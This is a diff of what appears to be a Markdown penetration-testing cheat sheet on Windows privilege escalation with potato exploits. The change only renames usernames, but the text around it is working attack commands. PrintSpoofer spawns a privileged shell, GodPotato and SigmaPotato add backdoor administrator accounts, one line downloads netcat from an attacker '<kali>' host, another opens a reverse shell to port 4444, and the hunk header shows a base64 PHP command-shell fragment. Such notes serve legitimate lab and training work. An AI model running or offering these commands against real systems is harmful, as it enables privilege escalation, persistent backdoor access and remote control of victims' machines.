@@ -910,16 +910,16 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     `.\PrintSpoofer64.exe -i -c powershell.exe`  
   - 🖥️ **GodPotato.exe**
     ```
-    .\GodPotato-NET4 -cmd "net user godpotatoUser password123! /add"
-    .\GodPotato-NET4 -cmd "net localgroup Administrators godpotatoUser /add"
+    .\GodPotato-NET4 -cmd "net user godAdmin password123! /add"
+    .\GodPotato-NET4 -cmd "net localgroup Administrators godAdmin /add"
 
     iwr -uri http://<kali>/nc64.exe -OutFile 'nc64.exe'
     .\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe <kali> 4444"
     ```
   - 🖥️ **SigmaPotato.exe**  
     ```
-    .\SigmaPotato "net user dave4 lab /add
-    .\SigmaPotato "net localgroup Administrators dave4 /add"
+    .\SigmaPotato "net user sigmaAdmin lab /add
+    .\SigmaPotato "net localgroup Administrators sigmaAdmin /add"
     ```
   
 | Exploit       | Works On                           | Privilege Required              | Command Example                                                                 |
